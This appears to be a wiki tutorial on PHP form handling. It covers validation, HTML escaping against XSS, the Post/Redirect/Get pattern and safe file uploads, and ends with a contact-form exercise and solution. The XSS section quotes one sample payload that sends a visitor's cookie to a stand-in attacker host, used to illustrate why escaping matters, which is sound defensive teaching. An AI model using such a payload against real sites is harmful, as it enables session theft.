## The life of a form submission

```text
1. GET  register.php            → PHP shows the empty form
2. user types, clicks "Create account"
3. POST register.php  (email=…&password=…)
                                → PHP validates
   ├─ invalid → shows the form again with an error message
   └─ valid   → saves to the database → redirects (302) to login.php
4. GET  login.php               → the browser follows the redirect
```

Every form page in the fitness site works like this, with the form and the code that processes it in the **same file**.

## Was the form submitted?

A page that shows *and* processes a form must know which of the two is happening. There are two common checks:

```php
// 1. Check the request method (used by the fitness site)
if ($_SERVER['REQUEST_METHOD'] === 'POST') { ... }

// 2. Check that the submit button's name was sent (used by the professor)
if (isset($_POST['addStudent'])) { ... }
```

The second one requires the button to have a `name` (`<input type="submit" name="addStudent">`). It is handy when one page has **several** forms, because each button can have a different name. The first is simpler when there is only one form, or when you identify the action with a hidden field like `<input type="hidden" name="do" value="save_plan">`.

## Reading values safely

```php
$email = trim($_POST['email'] ?? '');
$pass  = $_POST['password'] ?? '';
$id    = (int) ($_POST['id'] ?? 0);
```

- `?? ''` avoids "Undefined array key" when a field was not sent.
- `trim()` removes accidental spaces (copy-pasted emails often end with one).
- `(int)` turns an ID into a real number. `"5 OR 1=1"` becomes `5`.
- Passwords are **not** trimmed: a space can be a deliberate part of a password.

## Validation: is the input acceptable?

**Validation** means checking that input meets your rules *before* you use it. Never skip it, even when the HTML form has `required`.

| Rule | PHP check |
| --- | --- |
| Not empty | `$name !== ''` (after `trim`) or `!empty($name)` |
| Valid email | `filter_var($email, FILTER_VALIDATE_EMAIL)` |
| Minimum length | `strlen($pass) >= 8` (`mb_strlen` for ä/ö/ü-heavy text) |
| Maximum length | `mb_strlen($msg) <= 500` |
| A number | `is_numeric($price)` or `filter_var($x, FILTER_VALIDATE_INT)` |
| In a range | `$grade >= 0 && $grade <= 100` |
| One of a fixed list | `in_array($plan, ['Basic','Premium','Student'], true)` |
| Exactly 6 digits | `preg_match('/^\d{6}$/', $code)` |
| A valid date | `DateTime::createFromFormat('Y-m-d', $d) !== false` |

## Escaping output: the XSS rule

Validation protects the **database**. **Escaping** protects the **page**. Whenever you print something that came from a user, you must escape it:

```php
echo htmlspecialchars($name, ENT_QUOTES);   // or the fitness site's shortcut: h($name)
```

`htmlspecialchars` turns the characters that have meaning in HTML into harmless text:

| Character | Becomes |
| --- | --- |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#039;` (with `ENT_QUOTES`) |

Why it matters: imagine someone sends the contact form with the subject `<script>document.location='https://evil.example/?c='+document.cookie</script>`. If the admin page prints the subject without escaping, that script **runs in the admin's browser** and can steal the admin's session. This attack is called **Cross-Site Scripting (XSS)**.

<Warning title="The rule">
Escape **at the moment you print**, every time, with no exceptions. The professor's admin search prints database values directly (`{$row['SName']}`), so a student named `<script>…` would run code in the admin's browser. The fitness site wraps every printed value in `h()`.
</Warning>

<Mochi>
Validation is the bouncer at the door: "you can't come in like that". Escaping is the glass case in the museum: even if something dangerous got inside, people can look at it but not touch it.
</Mochi>

## Showing errors and keeping input

Nobody wants to retype a whole form because one field was wrong. Put the submitted value back into the field, escaped:

```php
<input type="email" name="email" value="<?= h($_POST['email'] ?? '') ?>">
<?php if ($msg): ?><div class="alert alert-danger"><?= h($msg) ?></div><?php endif; ?>
```

Never refill password fields. The fitness site uses a small helper for the alert box:

```php
function alert($msg, $type = 'danger') {
    return $msg ? '<div class="alert alert-' . $type . ' py-2">' . h($msg) . '</div>' : '';
}
```

## Redirects and Post/Redirect/Get

After a successful POST you should **redirect**:

```php
header('Location: login.php?registered=1');
exit;
```

`header()` adds an HTTP header to the response; `Location` tells the browser to request another page (status 302). `exit` stops the script so nothing else runs or prints.

Why redirect instead of just printing "Saved!"? If the user reloads a page that was the result of a POST, the browser **sends the POST again**: a second registration, a duplicate message, a double payment. Redirecting turns the final page into a normal GET, which is safe to reload. This is the **Post/Redirect/Get (PRG)** pattern.

The professor's `addStudent.php` instead prints a message and redirects with JavaScript after five seconds. It works, but a reload during those five seconds inserts the student twice, and users without JavaScript are stuck.

<Warning title="Cannot modify header information – headers already sent">
`header()` must run **before any output**: no `echo`, no HTML, not even a blank line or space before `<?php`. Headers travel before the body, so once a single character has been sent it is too late. If you see this error, look at the file and line named in the message, which is where output started.
</Warning>

## A complete example: the fitness registration page

Walk through it:

1. `require 'config.php'` provides the database `$pdo` and helpers like `go()`.
2. Only on POST: read and trim the email, read the password.
3. Validate in order. The first failure sets `$msg`.
4. Only if valid: decide the role, hash the password, insert with a **prepared statement** (more in [PHP + MySQL](/wiki/php-mysql)).
5. On success, `go()` redirects to the login page (PRG).

7. Execution continues to the HTML below, which shows the form plus `alert($msg)`.

## File uploads

A file arrives in `$_FILES['userfile']`, an array with these keys:

| Key | Example | Meaning |
| --- | --- | --- |
| `name` | `"me.jpg"` | Original file name (from the user: do not trust it) |
| `type` | `"image/jpeg"` | Type the browser *claims* (do not trust it) |
| `tmp_name` | `"C:\xampp\tmp\php3A.tmp"` | Where PHP stored the upload temporarily |
| `error` | `0` | `UPLOAD_ERR_OK` (0) means success |
| `size` | `48213` | Size in bytes |

The professor's `addStudent.php` reads the uploaded image and stores the raw bytes in a `LONGBLOB` column:

<Source file="Learning/SMW_AdminModule/Students/addStudent.php" from={29} to={32} />

A safer version checks the error code, the size and the **real** type before using the file:

```php
$f = $_FILES['userfile'] ?? null;
if (!$f || $f['error'] !== UPLOAD_ERR_OK) $errors[] = 'Upload failed.';
elseif ($f['size'] > 2_000_000) $errors[] = 'Max 2 MB.';
elseif (!in_array(mime_content_type($f['tmp_name']), ['image/jpeg', 'image/png'], true)) $errors[] = 'Only JPG or PNG.';
else {
    $name = bin2hex(random_bytes(8)) . '.jpg';                 // never reuse the user's file name
    move_uploaded_file($f['tmp_name'], __DIR__ . "/uploads/$name");
}
```

Storing images as files and only their **name** in the database keeps the database small and lets the browser cache images. Storing them as BLOBs (like SMW does) is simpler to back up but makes every query that selects `*` heavy.

<Exercise title="Validated contact form">
Build `contact.php` (form + processing in one file) with email, subject and message. Rules: valid email, subject 3–150 characters, message 10–500 characters. Show all errors as a list, keep the typed values after an error, and after success redirect to `contact.php?sent=1`, which shows "Thank you!".

<Solution>
```php:contact.php
<?php
function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES); }

$errors = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email   = trim($_POST['email'] ?? '');
    $subject = trim($_POST['subject'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) $errors[] = 'Please enter a valid email.';
    if (mb_strlen($subject) < 3 || mb_strlen($subject) > 150) $errors[] = 'Subject: 3–150 characters.';
    if (mb_strlen($message) < 10 || mb_strlen($message) > 500) $errors[] = 'Message: 10–500 characters.';

    if (!$errors) {
        // here you would INSERT into the database
        header('Location: contact.php?sent=1');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Contact</title></head>
<body>
<?php if (isset($_GET['sent'])): ?>
  <p>Thank you! We got your message.</p>
<?php endif; ?>

<?php if ($errors): ?>
  <ul style="color:#c00"><?php foreach ($errors as $e): ?><li><?= h($e) ?></li><?php endforeach; ?></ul>
<?php endif; ?>

<form method="post">
  <label>Email <input type="email" name="email" value="<?= h($_POST['email'] ?? '') ?>" required></label><br>
  <label>Subject <input name="subject" value="<?= h($_POST['subject'] ?? '') ?>" required></label><br>
  <label>Message <textarea name="message" required><?= h($_POST['message'] ?? '') ?></textarea></label><br>
  <button>Send</button>
</form>
</body></html>
```
The `header()` call happens before any HTML is printed, which is why all the processing sits at the very top of the file. Values are refilled with `h()` so a quote in the subject cannot break the `value="…"` attribute.
</Solution>
